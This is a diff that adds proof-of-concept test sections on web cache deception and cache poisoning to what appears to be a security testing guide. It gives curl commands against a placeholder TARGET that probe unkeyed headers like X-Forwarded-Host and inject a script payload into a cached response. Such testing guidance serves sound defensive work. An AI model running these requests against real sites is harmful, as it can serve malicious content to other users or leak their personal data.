@@ -90,6 +90,45 @@ X-Forwarded-Host: evil.tld
 
 A cache is only safe when its key matches the response's true authority boundary. Any response whose body depends on identity, or on an input absent from the cache key, must not be stored in a shared cache.
 
+## Dynamic Test / PoC — web cache deception
+
+**Suffix / extension confusion** on authenticated routes:
+
+```bash
+curl -s -D- -H "Cookie: SESSION=victim" "https://TARGET/account/nonexistent.css" | grep -iE 'cache-control|x-cache|age|vary'
+curl -s -H "Cookie: SESSION=attacker" "https://TARGET/account/nonexistent.css"
+```
+
+Confirmed when a clean session receives another identity's body, or `X-Cache: HIT` / `Age > 0` on a personalized response without identity in the cache key.
+
+### Dynamic Test / PoC — cache poisoning
+
+Distinct from WCD: attacker poisons a shared cache entry so all users receive malicious content.
+
+**Identify cache behavior:**
+
+```bash
+curl -s -D- "https://TARGET/" | grep -iE 'x-cache|age|cache-control|cf-cache|vary'
+```
+
+**Probe unkeyed headers** reflected but absent from cache key:
+
+```bash
+curl -s "https://TARGET/" -H "X-Forwarded-Host: evil.tld" | grep "evil.tld"
+curl -s "https://TARGET/" -H "X-Forwarded-Scheme: nothttps" | grep -i redirect
+```
+
+**Confirm poisoning** — use a cache buster on the poison request, then fetch the canonical URL without the header:
+
+```bash
+curl -s "https://TARGET/?cb=$(date +%s)" \
+  -H "X-Forwarded-Host: evil.tld\"><script>alert(1)</script>" -D- | grep -i x-cache
+
+curl -s "https://TARGET/" | grep "alert(1)"
+```
+
+Poisoning is confirmed when the second (header-free) request returns `X-Cache: HIT` (or `Age > 0`) and still contains the injected payload.
+
 ---
 
 ---
